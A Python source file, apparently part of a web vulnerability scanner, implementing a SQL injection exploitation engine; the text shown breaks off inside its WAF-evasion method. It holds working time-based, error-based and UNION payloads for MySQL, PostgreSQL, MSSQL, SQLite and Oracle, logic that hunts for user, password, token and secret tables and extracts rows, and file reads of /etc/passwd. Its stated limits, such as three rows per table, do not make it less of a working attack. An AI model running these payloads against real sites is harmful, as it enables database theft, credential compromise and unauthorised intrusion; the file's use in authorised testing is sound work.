"""
Deep SQL Injection Exploitation Engine

Comprehensive SQLi exploitation module that goes beyond detection:
1. Blind SQLi Detection (boolean-based, time-based, error-based)
2. Progressive Exploitation (DB fingerprint → column count → data extraction)
3. DB-Specific Payloads (MySQL, PostgreSQL, MSSQL, SQLite, Oracle)
4. WAF-Aware Evasion Variants
5. Structured results with evidence chain

Called AFTER basic SQLi is confirmed by the scanner, to escalate the finding
and demonstrate real impact with proof-of-concept data extraction.

Safety limits:
- Max 100 requests per injection point
- Max 3 rows extracted per table (proof only)
- NEVER attempts write operations (DROP, DELETE, UPDATE, INSERT)
- NEVER attempts file write (INTO OUTFILE) — only file read to prove impact
- 30s timeout per injection point
"""
import asyncio
import re
import time
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# DB fingerprint signatures from error messages
# ---------------------------------------------------------------------------
DB_FINGERPRINTS = {
    "mysql": [
        r"you have an error in your sql syntax",
        r"warning.*mysql",
        r"unclosed quotation mark",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"MariaDB",
        r"supplied argument is not a valid MySQL",
        r"mysqli?[_\.]",
        r"com\.mysql\.jdbc",
    ],
    "postgresql": [
        r"pg_query",
        r"pg_exec",
        r"PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"unterminated quoted string",
        r"postgresql",
        r"valid PostgreSQL result",
        r"org\.postgresql",
    ],
    "mssql": [
        r"Microsoft SQL Native Client",
        r"ODBC SQL Server Driver",
        r"\[SQL Server\]",
        r"unclosed quotation mark after the character string",
        r"mssql_query",
        r"Incorrect syntax near",
        r"Msg \d+, Level \d+, State \d+",
        r"System\.Data\.SqlClient",
    ],
    "sqlite": [
        r"SQLite3?::",
        r"sqlite_",
        r"SQLITE_ERROR",
        r"near \".*\": syntax error",
        r"unrecognized token:",
    ],
    "oracle": [
        r"ORA-\d{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"oracle\.jdbc",
    ],
}

# ---------------------------------------------------------------------------
# UNION data extraction queries per DB type
# ---------------------------------------------------------------------------
UNION_QUERIES = {
    "mysql": {
        "version": "@@version",
        "current_user": "current_user()",
        "current_db": "database()",
        "tables": "GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()",
        "columns": "GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}'",
        "dump": "GROUP_CONCAT({cols} SEPARATOR 0x0a) FROM {table} LIMIT 3",
        "file_read": "LOAD_FILE('{path}')",
        "concat": "CONCAT('{marker}',{expr},'{marker}')",
        "concat_cols": "CONCAT_WS(0x3a,{cols})",
    },
    "postgresql": {
        "version": "version()",
        "current_user": "current_user",
        "current_db": "current_database()",
        "tables": "string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'",
        "columns": "string_agg(column_name,',') FROM information_schema.columns WHERE table_schema='public' AND table_name='{table}'",
        "dump": "string_agg({cols},chr(10)) FROM (SELECT {cols} FROM {table} LIMIT 3) AS t",
        "file_read": "pg_read_file('{path}')",
        "concat": "'{marker}'||{expr}||'{marker}'",
        "concat_cols": "{cols_pipe}",
    },
    "mssql": {
        "version": "@@version",
        "current_user": "SYSTEM_USER",
        "current_db": "DB_NAME()",
        "tables": "STRING_AGG(table_name,',') FROM information_schema.tables WHERE table_type='BASE TABLE'",
        "columns": "STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='{table}'",
        "dump": "STRING_AGG({cols},CHAR(10)) FROM (SELECT TOP 3 {cols} FROM {table}) AS t",
        "concat": "'{marker}'+CAST({expr} AS VARCHAR(4000))+'{marker}'",
        "concat_cols": "{cols_plus}",
    },
    "sqlite": {
        "version": "sqlite_version()",
        "current_user": "'sqlite'",
        "current_db": "'main'",
        "tables": "GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table'",
        "columns": "GROUP_CONCAT(name,',') FROM pragma_table_info('{table}')",
        "dump": "GROUP_CONCAT({cols},char(10)) FROM (SELECT {cols} FROM {table} LIMIT 3)",
        "concat": "'{marker}'||{expr}||'{marker}'",
        "concat_cols": "{cols_pipe}",
    },
    "oracle": {
        "version": "banner FROM v$version WHERE ROWNUM=1",
        "current_user": "user FROM dual",
        "current_db": "ora_database_name FROM dual",
        "tables": "LISTAGG(table_name,',') WITHIN GROUP(ORDER BY table_name) FROM user_tables",
        "columns": "LISTAGG(column_name,',') WITHIN GROUP(ORDER BY column_id) FROM user_tab_columns WHERE table_name=UPPER('{table}')",
        "dump": "LISTAGG({cols},CHR(10)) WITHIN GROUP(ORDER BY 1) FROM (SELECT {cols} FROM {table} WHERE ROWNUM<=3)",
        "concat": "'{marker}'||{expr}||'{marker}'",
        "concat_cols": "{cols_pipe}",
    },
}

# ---------------------------------------------------------------------------
# Time-based blind payloads per DB type
# ---------------------------------------------------------------------------
TIME_PAYLOADS = {
    "mysql": [
        "' AND SLEEP({delay})-- -",
        "' AND (SELECT SLEEP({delay}))-- -",
        "' OR SLEEP({delay})-- -",
        "1' AND BENCHMARK(5000000,SHA1('test'))-- -",
    ],
    "postgresql": [
        "'; SELECT pg_sleep({delay})-- -",
        "' AND (SELECT pg_sleep({delay}))-- -",
        "' OR (SELECT pg_sleep({delay}))='",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:{delay}'-- -",
        "' AND 1=(SELECT 1 FROM (SELECT SLEEP({delay}))a)-- -",
    ],
    "sqlite": [
        "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000/2))))-- -",
    ],
    "oracle": [
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})-- -",
    ],
}

# ---------------------------------------------------------------------------
# Error-based extraction payloads per DB type
# ---------------------------------------------------------------------------
ERROR_EXTRACT_PAYLOADS = {
    "mysql": [
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))-- -",
        "1 AND UPDATEXML(1,CONCAT(0x7e,({expr}),0x7e),1)-- -",
        "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(({expr}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ],
    "postgresql": [
        "1 AND 1=CAST(({expr}) AS INT)-- -",
        "1 AND 1/(SELECT 0 FROM (SELECT ({expr})::INT)x)-- -",
    ],
    "mssql": [
        "1 AND 1=CONVERT(INT,({expr}))-- -",
        "1 HAVING 1=CONVERT(INT,({expr}))-- -",
    ],
    "sqlite": [],
    "oracle": [
        "1 AND 1=UTL_INADDR.GET_HOST_ADDRESS(({expr}))-- -",
        "1 AND 1=CTXSYS.DRITHSX.SN(1,({expr}))-- -",
    ],
}

# Marker for identifying UNION output in response
UNION_MARKER = "pHnT0m_"

# Tables considered interesting for credential extraction
INTERESTING_TABLE_KEYWORDS = (
    "user", "admin", "account", "login", "credential", "member",
    "auth", "password", "customer", "employee", "staff", "person",
    "session", "token", "api_key", "secret",
)

# Columns that indicate credential data
USER_COL_KEYWORDS = ("user", "name", "login", "email", "account", "username")
PASS_COL_KEYWORDS = ("pass", "pwd", "hash", "secret", "token", "credential")

# Safety constants
MAX_REQUESTS = 100
MAX_ROWS_PER_TABLE = 3
MAX_TABLES_EXTRACT = 3
REQUEST_TIMEOUT = 30.0
TIME_DELAY = 3           # seconds for time-based blind
TIME_THRESHOLD = 2.5     # seconds — above this = confirmed time-based


class DeepSQLi:
    """Comprehensive SQL injection exploitation engine."""

    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(10)
        self._request_count = 0

    # -----------------------------------------------------------------------
    # Public API
    # -----------------------------------------------------------------------
    async def analyze(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        method: str = "GET",
        extra_fields: dict = None,
        db_type_hint: str = None,
        original_value: str = "1",
    ) -> dict:
        """
        Deep SQLi analysis on a confirmed injectable endpoint.

        Returns structured results with DB type, version, tables, columns,
        sample data, evidence chain, severity, and impact assessment.
        """
        self._request_count = 0

        result = {
            "db_type": None,
            "db_version": None,
            "injection_type": None,
            "tables_found": [],
            "columns_found": {},
            "sample_data": {},
            "severity": "high",
            "impact": "",
            "evidence": [],
            # Legacy fields for backward compat with exploiter.py
            "version": None,
            "current_user": None,
            "current_db": None,
            "tables": [],
            "extracted_data": {},
            "column_count": None,
            "injectable_column": None,
            "file_read": None,
            "techniques_used": [],
        }

        # ------ Step 1: DB fingerprinting ------
        db_type = db_type_hint or await self._fingerprint_db(client, url, param, method, extra_fields)
        if not db_type:
            db_type = "mysql"  # Default assumption
        result["db_type"] = db_type
        result["evidence"].append(f"DB fingerprinted as: {db_type}")
        result["techniques_used"].append(f"error_fingerprint:{db_type}")
        logger.info(f"DeepSQLi: DB type = {db_type} for {url} param={param}")

        # ------ Step 2: Detect injection type ------
        injection_type = await self._detect_injection_type(
            client, url, param, method, extra_fields, db_type, original_value
        )
        result["injection_type"] = injection_type
        result["evidence"].append(f"Injection type: {injection_type}")
        result["techniques_used"].append(f"injection_type:{injection_type}")
        logger.info(f"DeepSQLi: injection type = {injection_type}")

        # ------ Step 3: Try UNION-based exploitation first ------
        if injection_type in ("union-based", "unknown"):
            union_result = await self._exploit_union(
                client, url, param, method, extra_fields, db_type
            )
            if union_result.get("success"):
                self._merge_union_result(result, union_result)
                self._assess_impact(result)
                return result

        # ------ Step 4: Try error-based extraction ------
        if injection_type in ("error-based", "unknown") or not result.get("version"):
            error_result = await self._exploit_error_based(
                client, url, param, method, extra_fields, db_type
            )
            if error_result.get("success"):
                self._merge_error_result(result, error_result)

        # ------ Step 5: Try blind boolean extraction (limited) ------
        if injection_type in ("blind-boolean", "unknown") and not result.get("db_version"):
            blind_result = await self._exploit_blind_boolean(
                client, url, param, method, extra_fields, db_type, original_value
            )
            if blind_result.get("success"):
                self._merge_blind_result(result, blind_result)

        self._assess_impact(result)
        return result

    # -----------------------------------------------------------------------
    # Injection Type Detection
    # -----------------------------------------------------------------------
    async def _detect_injection_type(
        self, client, url, param, method, extra_fields, db_type, original_value
    ) -> str:
        """Determine the most effective injection technique."""

        # 1) Check boolean-based blind
        if await self._check_boolean_blind(client, url, param, method, extra_fields, original_value):
            return "blind-boolean"

        # 2) Check time-based blind
        if await self._check_time_blind(client, url, param, method, extra_fields, db_type):
            return "blind-time"

        # 3) Check error-based
        if await self._check_error_based(client, url, param, method, extra_fields, db_type):
            return "error-based"

        # 4) Check UNION-based (try ORDER BY)
        col_count = await self._find_column_count(client, url, param, method, extra_fields)
        if col_count:
            return "union-based"

        return "unknown"

    async def _check_boolean_blind(self, client, url, param, method, extra_fields, original_value) -> bool:
        """Test boolean-based blind SQLi by comparing AND 1=1 vs AND 1=2."""
        if self._budget_exhausted():
            return False

        try:
            true_payload = f"{original_value}' AND '1'='1"
            false_payload = f"{original_value}' AND '1'='2"

            true_resp = await self._send_safe(client, url, param, true_payload, method, extra_fields)
            false_resp = await self._send_safe(client, url, param, false_payload, method, extra_fields)

            if true_resp is None or false_resp is None:
                return False

            # Also test without quotes for numeric params
            if true_resp.text == false_resp.text:
                true_payload = f"{original_value} AND 1=1-- -"
                false_payload = f"{original_value} AND 1=2-- -"
                true_resp = await self._send_safe(client, url, param, true_payload, method, extra_fields)
                false_resp = await self._send_safe(client, url, param, false_payload, method, extra_fields)
                if true_resp is None or false_resp is None:
                    return False

            # Significant difference in responses indicates boolean blind
            true_len = len(true_resp.text)
            false_len = len(false_resp.text)

            if true_resp.status_code != false_resp.status_code:
                return True
            if abs(true_len - false_len) > 50:
                return True
            if true_resp.text != false_resp.text:
                # Content differs but length is similar — still boolean blind
                return True
        except Exception as e:
            logger.debug(f"Boolean blind check error: {e}")
        return False

    async def _check_time_blind(self, client, url, param, method, extra_fields, db_type) -> bool:
        """Test time-based blind SQLi by measuring response delay.

        Uses adaptive baseline calibration: measures 3 normal requests to compute
        average + stddev, then uses threshold = max(baseline_avg * 3, TIME_THRESHOLD).
        This avoids false positives on slow servers and false negatives on fast ones.
        """
        if self._budget_exhausted():
            return False

        payloads = TIME_PAYLOADS.get(db_type, TIME_PAYLOADS["mysql"])
        # Also try generic payloads if DB unknown
        if db_type not in TIME_PAYLOADS:
            payloads = TIME_PAYLOADS["mysql"] + TIME_PAYLOADS["postgresql"]

        # Adaptive baseline: measure 3 normal requests for calibration
        baseline_times = []
        for _ in range(3):
            if self._budget_exhausted():
                break
            b_start = time.monotonic()
            b_resp = await self._send_safe(client, url, param, "1", method, extra_fields)
            b_elapsed = time.monotonic() - b_start
            if b_resp is not None:
                baseline_times.append(b_elapsed)

        if not baseline_times:
            return False

        baseline_avg = sum(baseline_times) / len(baseline_times)
        # Adaptive threshold: at least TIME_THRESHOLD, or 3x the average baseline
        adaptive_threshold = max(TIME_THRESHOLD, baseline_avg * 3)

        for payload_tmpl in payloads[:3]:  # Limit attempts
            if self._budget_exhausted():
                break
            payload = payload_tmpl.format(delay=TIME_DELAY)
            start = time.monotonic()
            resp = await self._send_safe(client, url, param, payload, method, extra_fields)
            elapsed = time.monotonic() - start

            if resp is not None and (elapsed - baseline_avg) >= adaptive_threshold:
                logger.info(
                    f"DeepSQLi: Time-based blind confirmed "
                    f"(elapsed={elapsed:.1f}s, baseline_avg={baseline_avg:.2f}s, "
                    f"threshold={adaptive_threshold:.2f}s)"
                )
                return True

        return False

    async def _check_error_based(self, client, url, param, method, extra_fields, db_type) -> bool:
        """Check if error-based extraction is possible."""
        if self._budget_exhausted():
            return False

        payloads = ERROR_EXTRACT_PAYLOADS.get(db_type, ERROR_EXTRACT_PAYLOADS["mysql"])
        for payload_tmpl in payloads[:2]:
            if self._budget_exhausted():
                break
            payload = payload_tmpl.format(expr="1")
            resp = await self._send_safe(client, url, param, payload, method, extra_fields)
            if resp and resp.status_code in (200, 500, 503):
                body = resp.text
                # Look for error message containing our extracted value
                if re.search(r"~1~|XPATH|EXTRACTVALUE|UPDATEXML|CAST|CONVERT", body, re.IGNORECASE):
                    return True
        return False

    # -----------------------------------------------------------------------
    # UNION-Based Exploitation
    # -----------------------------------------------------------------------
    async def _exploit_union(self, client, url, param, method, extra_fields, db_type) -> dict:
        """Full UNION-based exploitation chain."""
        result = {"success": False}

        # Step 1: Find column count
        col_count = await self._find_column_count(client, url, param, method, extra_fields)
        if not col_count:
            return result
        result["column_count"] = col_count

        # Step 2: Find injectable column
        injectable_col = await self._find_injectable_column(
            client, url, param, method, extra_fields, col_count, db_type
        )
        if injectable_col is None:
            return result
        result["injectable_column"] = injectable_col

        queries = UNION_QUERIES.get(db_type, UNION_QUERIES["mysql"])
        result["success"] = True
        evidence = []

        evidence.append(f"ORDER BY {col_count} succeeded, ORDER BY {col_count + 1} failed -> {col_count} columns")
        evidence.append(f"Injectable column position: {injectable_col}")

        # Step 3: Extract DB version
        version = await self._union_extract(
            client, url, param, method, extra_fields, col_count, injectable_col,
            queries["version"], db_type
        )
        result["version"] = version
        if version:
            evidence.append(f"DB version: {version}")

        # Step 4: Extract current user
        cur_user = await self._union_extract(
            client, url, param, method, extra_fields, col_count, injectable_col,
            queries["current_user"], db_type
        )
        result["current_user"] = cur_user
        if cur_user:
            evidence.append(f"DB user: {cur_user}")

        # Step 5: Extract current database
        cur_db = await self._union_extract(
            client, url, param, method, extra_fields, col_count, injectable_col,
            queries["current_db"], db_type
        )
        result["current_db"] = cur_db
        if cur_db:
            evidence.append(f"Current database: {cur_db}")

        # Step 6: Extract table names
        tables_str = await self._union_extract(
            client, url, param, method, extra_fields, col_count, injectable_col,
            queries["tables"], db_type
        )
        tables = []
        if tables_str:
            tables = [t.strip() for t in tables_str.split(",") if t.strip()]
            result["tables"] = tables
            evidence.append(f"Tables found ({len(tables)}): {', '.join(tables[:10])}")

        # Step 7: Extract columns for interesting tables
        columns_found = {}
        sample_data = {}
        extracted_data = {}  # Legacy format

        interesting = [t for t in tables if any(k in t.lower() for k in INTERESTING_TABLE_KEYWORDS)]
        for table in interesting[:MAX_TABLES_EXTRACT]:
            if self._budget_exhausted():
                break
            col_query = queries["columns"].format(table=table)
            cols_str = await self._union_extract(
                client, url, param, method, extra_fields, col_count, injectable_col,
                col_query, db_type
            )
            if not cols_str:
                continue
            cols = [c.strip() for c in cols_str.split(",") if c.strip()]
            columns_found[table] = cols
            extracted_data[table] = {"columns": cols, "rows": []}
            evidence.append(f"Table '{table}' columns: {', '.join(cols)}")

            # Step 8: Extract sample data (max 3 rows)
            user_col = next((c for c in cols if any(k in c.lower() for k in USER_COL_KEYWORDS)), None)
            pass_col = next((c for c in cols if any(k in c.lower() for k in PASS_COL_KEYWORDS)), None)

            # Pick columns to extract: user+pass if found, else first 3 cols
            if user_col and pass_col:
                extract_cols = [user_col, pass_col]
            elif user_col:
                extract_cols = [user_col] + [c for c in cols if c != user_col][:2]
            else:
                extract_cols = cols[:3]

            if extract_cols:
                dump_result = await self._extract_table_data(
                    client, url, param, method, extra_fields, col_count,
                    injectable_col, db_type, table, extract_cols
                )
                if dump_result:
                    # Redact sensitive data
                    redacted_rows = self._redact_sensitive(dump_result, extract_cols)
                    sample_data[table] = redacted_rows
                    raw_rows = [":".join(str(v) for v in r.values()) for r in dump_result]
                    extracted_data[table]["rows"] = raw_rows[:MAX_ROWS_PER_TABLE]
                    evidence.append(f"Extracted {len(dump_result)} rows from '{table}'")

        result["columns_found"] = columns_found
        result["sample_data"] = sample_data
        result["extracted_data"] = extracted_data

        # Step 9: Try file read (MySQL/PostgreSQL only)
        file_read_result = None
        if db_type in ("mysql", "postgresql") and "file_read" in queries:
            for path in ("/etc/passwd", "/etc/hostname"):
                if self._budget_exhausted():
                    break
                file_content = await self._union_extract(
                    client, url, param, method, extra_fields, col_count,
                    injectable_col, queries["file_read"].format(path=path), db_type
                )
                if file_content and ("root:" in file_content or len(file_content) > 5):
                    file_read_result = {path: file_content[:500]}
                    evidence.append(f"File read successful: {path}")
                    break

        result["file_read"] = file_read_result
        result["evidence"] = evidence
        return result

    async def _extract_table_data(
        self, client, url, param, method, extra_fields, col_count,
        injectable_col, db_type, table, columns
    ) -> list[dict] | None:
        """Extract rows from a table via UNION injection."""
        if self._budget_exhausted():
            return None

        queries = UNION_QUERIES.get(db_type, UNION_QUERIES["mysql"])

        # Build column concatenation based on DB type
        cols_expr = self._build_cols_concat(columns, db_type)
        dump_query = queries["dump"].format(cols=cols_expr, table=table)

        raw = await self._union_extract(
            client, url, param, method, extra_fields, col_count,
            injectable_col, dump_query, db_type
        )
        if not raw:
            return None

        # Parse rows
        rows = []
        for line in raw.split("\n"):
            line = line.strip()
            if not line:
                continue
            parts = line.split(":")
            row = {}
            for i, col in enumerate(columns):
                row[col] = parts[i] if i < len(parts) else ""
            rows.append(row)
            if len(rows) >= MAX_ROWS_PER_TABLE:
                break
        return rows if rows else None

    def _build_cols_concat(self, columns: list[str], db_type: str) -> str:
        """Build a column concatenation expression for the given DB type."""
        if db_type == "mysql":
            return "CONCAT_WS(0x3a," + ",".join(columns) + ")"
        elif db_type == "mssql":
            return "+':'+".join([f"CAST({c} AS VARCHAR(500))" for c in columns])
        else:
            # PostgreSQL, SQLite, Oracle — use || operator
            return "||':'||".join([f"CAST({c} AS TEXT)" for c in columns])

    @staticmethod
    def _redact_sensitive(rows: list[dict], columns: list[str]) -> list[dict]:
        """Redact password/secret values in sample data for reporting."""
        redacted = []
        for row in rows:
            r = {}
            for col, val in row.items():
                if any(k in col.lower() for k in PASS_COL_KEYWORDS):
                    r[col] = "[REDACTED]"
                elif any(k in col.lower() for k in ("email",)):
                    # Partially redact emails
                    if "@" in str(val):
                        parts = str(val).split("@")
                        r[col] = parts[0][:2] + "***@" + parts[1]
                    else:
                        r[col] = str(val)[:3] + "[REDACTED]"
                else:
                    r[col] = val
            redacted.append(r)
        return redacted

    # -----------------------------------------------------------------------
    # Error-Based Exploitation
    # -----------------------------------------------------------------------
    async def _exploit_error_based(self, client, url, param, method, extra_fields, db_type) -> dict:
        """Extract data via error-based injection."""
        result = {"success": False}
        payloads = ERROR_EXTRACT_PAYLOADS.get(db_type, ERROR_EXTRACT_PAYLOADS["mysql"])
        if not payloads:
            return result

        evidence = []
        expressions = {
            "version": self._version_expr(db_type),
            "current_user": self._user_expr(db_type),
            "current_db": self._db_expr(db_type),
        }

        for key, expr in expressions.items():
            if self._budget_exhausted():
                break
            value = await self._error_extract_value(
                client, url, param, method, extra_fields, payloads, expr
            )
            if value:
                result[key] = value
                result["success"] = True
                evidence.append(f"{key}: {value}")

        # Try to get table names
        table_expr = self._tables_expr(db_type)
        if table_expr and not self._budget_exhausted():
            tables_str = await self._error_extract_value(
                client, url, param, method, extra_fields, payloads, table_expr
            )
            if tables_str:
                tables = [t.strip() for t in tables_str.split(",") if t.strip()]
                result["tables"] = tables
                evidence.append(f"Tables: {', '.join(tables[:10])}")

        result["evidence"] = evidence
        return result

    async def _error_extract_value(self, client, url, param, method, extra_fields, payloads, expr) -> str | None:
        """Try each error-based payload template to extract an expression value."""
        for payload_tmpl in payloads:
            if self._budget_exhausted():
                break
            payload = payload_tmpl.format(expr=expr)

            # Try original and WAF-evasion variants
            for variant in self._waf_variants(payload):
                if self._budget_exhausted():
                    break
                resp = await self._send_safe(client, url, param, variant, method, extra_fields)
                if resp:
                    extracted = self._parse_error_output(resp.text)
                    if extracted:
                        return extracted
        return None

    def _parse_error_output(self, body: str) -> str | None:
        """Parse extracted data from error messages."""
        patterns = [
            r"~([^~]+)~",                    # EXTRACTVALUE/UPDATEXML marker
            r"Duplicate entry '([^']+)'",     # Double query
            r"CAST failed.*?'([^']+)'",       # CAST conversion error
            r"converting.*?value '([^']+)'",  # CONVERT error
            r"invalid input syntax.*?\"([^\"]+)\"",  # PostgreSQL cast
        ]
        for pat in patterns:
            match = re.search(pat, body, re.IGNORECASE)
            if match:
                val = match.group(1).strip()
                # Clean up common artifacts
                val = re.sub(r'\d$', '', val)  # Remove trailing floor() digit
                if val and len(val) > 1:
                    return val
        return None

    # -----------------------------------------------------------------------
    # Blind Boolean Exploitation (limited — version only)
    # -----------------------------------------------------------------------
    async def _exploit_blind_boolean(
        self, client, url, param, method, extra_fields, db_type, original_value
    ) -> dict:
        """Extract DB version character-by-character via boolean blind."""
        result = {"success": False}
        version_expr = self._version_expr(db_type)
        version = ""

        # Extract version char by char (limit to 30 chars to save budget)
        for pos in range(1, 31):
            if self._budget_exhausted():
                break

            char = await self._blind_extract_char(
                client, url, param, method, extra_fields,
                version_expr, pos, original_value
            )
            if char is None:
                break
            version += char

        if version:
            result["success"] = True
            result["version"] = version
            result["evidence"] = [f"Version extracted via blind boolean ({len(version)} chars): {version}"]

        return result

    async def _blind_extract_char(
        self, client, url, param, method, extra_fields,
        expr, position, original_value
    ) -> str | None:
        """Extract a single character using binary search over ASCII range."""
        low, high = 32, 126

        while low <= high:
            if self._budget_exhausted():
                return None
            mid = (low + high) // 2

            # Test: ASCII(SUBSTRING(expr, pos, 1)) > mid
            payload = f"{original_value}' AND ASCII(SUBSTRING(({expr}),{position},1))>{mid}-- -"
            resp = await self._send_safe(client, url, param, payload, method, extra_fields)

            # Baseline for "true" comparison
            true_payload = f"{original_value}' AND '1'='1"
            true_resp = await self._send_safe(client, url, param, true_payload, method, extra_fields)

            if resp is None or true_resp is None:
                return None

            is_true = self._responses_match(resp, true_resp)

            if is_true:
                low = mid + 1
            else:
                high = mid

            if low == high:
                # Verify this character
                verify_payload = f"{original_value}' AND ASCII(SUBSTRING(({expr}),{position},1))={low}-- -"
                verify_resp = await self._send_safe(client, url, param, verify_payload, method, extra_fields)
                if verify_resp and self._responses_match(verify_resp, true_resp):
                    return chr(low)
                return None

        return None

    @staticmethod
    def _responses_match(resp1: httpx.Response, resp2: httpx.Response) -> bool:
        """Check if two responses are similar enough to be considered the same 'truth' state."""
        if resp1.status_code != resp2.status_code:
            return False
        len_diff = abs(len(resp1.text) - len(resp2.text))
        return len_diff < 50

    # -----------------------------------------------------------------------
    # Column Count Detection
    # -----------------------------------------------------------------------
    async def _find_column_count(self, client, url, param, method, extra_fields) -> int | None:
        """Determine column count using ORDER BY, then UNION SELECT NULL fallback."""
        # ORDER BY approach
        last_valid = None
        for n in range(1, 21):
            if self._budget_exhausted():
                break
            payload = f"1 ORDER BY {n}-- -"
            resp = await self._send_safe(client, url, param, payload, method, extra_fields)
            if resp is None:
                continue
            body = resp.text.lower()
            has_error = any(e in body for e in (
                "unknown column", "order by", "out of range",
                "error", "invalid", "number of columns",
            ))
            if resp.status_code != 200 or has_error:
                if last_valid:
                    return last_valid
                break
            last_valid = n

        if last_valid:
            return last_valid

        # Fallback: UNION SELECT NULL,NULL,...
        for n in range(1, 15):
            if self._budget_exhausted():
                break
            nulls = ",".join(["NULL"] * n)
            payload = f"1 UNION SELECT {nulls}-- -"
            resp = await self._send_safe(client, url, param, payload, method, extra_fields)
            if resp is None:
                continue
            body = resp.text.lower()
            has_error = any(e in body for e in (
                "different number", "operand", "column",
                "used in", "don't match", "error",
            ))
            if resp.status_code == 200 and not has_error:
                return n

        return None

    # -----------------------------------------------------------------------
    # Injectable Column Detection
    # -----------------------------------------------------------------------
    async def _find_injectable_column(
        self, client, url, param, method, extra_fields, col_count, db_type
    ) -> int | None:
        """Find which column position reflects data in the response."""
        for i in range(col_count):
            if self._budget_exhausted():
                break
            cols = ["NULL"] * col_count
            marker = f"'{UNION_MARKER}{i}'"
            cols[i] = marker
            payload = f"-1 UNION SELECT {','.join(cols)}-- -"
            resp = await self._send_safe(client, url, param, payload, method, extra_fields)
            if resp and f"{UNION_MARKER}{i}" in resp.text:
                logger.info(f"DeepSQLi: Injectable column = {i}")
                return i

        # WAF may block — try with evasion
        for i in range(col_count):
            if self._budget_exhausted():
                break
            cols = ["NULL"] * col_count
            marker = f"'{UNION_MARKER}{i}'"
            cols[i] = marker
            base_payload = f"-1 UNION SELECT {','.join(cols)}-- -"
            for variant in self._waf_variants(base_payload):
                if variant == base_payload:
                    continue  # Already tried
                if self._budget_exhausted():
                    break
                resp = await self._send_safe(client, url, param, variant, method, extra_fields)
                if resp and f"{UNION_MARKER}{i}" in resp.text:
                    logger.info(f"DeepSQLi: Injectable column = {i} (via WAF evasion)")
                    return i

        return None

    # -----------------------------------------------------------------------
    # UNION Data Extraction
    # -----------------------------------------------------------------------
    async def _union_extract(
        self, client, url, param, method, extra_fields,
        col_count, injectable_col, expression, db_type
    ) -> str | None:
        """Extract data via UNION SELECT injection with DB-specific concat."""
        if self._budget_exhausted():
            return None

        queries = UNION_QUERIES.get(db_type, UNION_QUERIES["mysql"])
        cols = ["NULL"] * col_count

        # Build the injectable column expression
        has_from = " FROM " in expression.upper()

        if has_from:
            parts = expression.split(" FROM ", 1)
            select_part = parts[0]
            from_part = parts[1]
            # Use sub-select with marker wrapping
            concat_expr = self._wrap_with_marker(f"({select_part})", db_type)
            cols[injectable_col] = f"(SELECT {concat_expr} FROM {from_part})"
        else:
            concat_expr = self._wrap_with_marker(expression, db_type)
            cols[injectable_col] = concat_expr

        payload = f"-1 UNION SELECT {','.join(cols)}-- -"

        # Try original payload
        extracted = await self._try_extract_payload(client, url, param, payload, method, extra_fields)
        if extracted:
            return extracted

        # Try WAF evasion variants
        for variant in self._waf_variants(payload):
            if variant == payload:
                continue
            if self._budget_exhausted():
                break
            extracted = await self._try_extract_payload(client, url, param, variant, method, extra_fields)
            if extracted:
                return extracted

        # Fallback: try alternative concat syntax
        cols_alt = ["NULL"] * col_count
        if has_from:
            parts = expression.split(" FROM ", 1)
            select_part = parts[0]
            from_part = parts[1]
            alt_concat = self._wrap_with_marker_alt(f"({select_part})", db_type)
            cols_alt[injectable_col] = f"(SELECT {alt_concat} FROM {from_part})"
        else:
            alt_concat = self._wrap_with_marker_alt(expression, db_type)
            cols_alt[injectable_col] = alt_concat

        payload_alt = f"-1 UNION SELECT {','.join(cols_alt)}-- -"
        extracted = await self._try_extract_payload(client, url, param, payload_alt, method, extra_fields)
        if extracted:
            return extracted

        return None

    async def _try_extract_payload(self, client, url, param, payload, method, extra_fields) -> str | None:
        """Send a payload and attempt to extract marker-delimited data."""
        resp = await self._send_safe(client, url, param, payload, method, extra_fields)
        if resp:
            return self._extract_marker(resp.text)
        return None

    def _wrap_with_marker(self, expr: str, db_type: str) -> str:
        """Wrap an expression with UNION_MARKER using DB-appropriate concat."""
        if db_type == "mysql":
            return f"CONCAT('{UNION_MARKER}',{expr},'{UNION_MARKER}')"
        elif db_type == "mssql":
            return f"'{UNION_MARKER}'+CAST({expr} AS VARCHAR(4000))+'{UNION_MARKER}'"
        else:
            # PostgreSQL, SQLite, Oracle
            return f"'{UNION_MARKER}'||CAST({expr} AS TEXT)||'{UNION_MARKER}'"

    def _wrap_with_marker_alt(self, expr: str, db_type: str) -> str:
        """Alternative marker wrapping (fallback syntax)."""
        if db_type == "mysql":
            return f"CONCAT(0x{UNION_MARKER.encode().hex()},{expr},0x{UNION_MARKER.encode().hex()})"
        elif db_type == "mssql":
            return f"'{UNION_MARKER}'+CONVERT(VARCHAR(4000),{expr})+'{UNION_MARKER}'"
        else:
            return f"'{UNION_MARKER}'||{expr}||'{UNION_MARKER}'"

    def _extract_marker(self, body: str) -> str | None:
        """Extract data between UNION_MARKER tags in response body."""
        pattern = re.escape(UNION_MARKER) + r"(.*?)" + re.escape(UNION_MARKER)
        match = re.search(pattern, body, re.DOTALL)
        if match:
            val = match.group(1).strip()
            return val if val else None
        return None

    # -----------------------------------------------------------------------
    # WAF Evasion
    # -----------------------------------------------------------------------
    @staticmethod
    def _waf_variants(payload: str) -> list[str]:
        """Generate WAF evasion variants of a SQL payload."""
        variants = [payload]  # Original always first

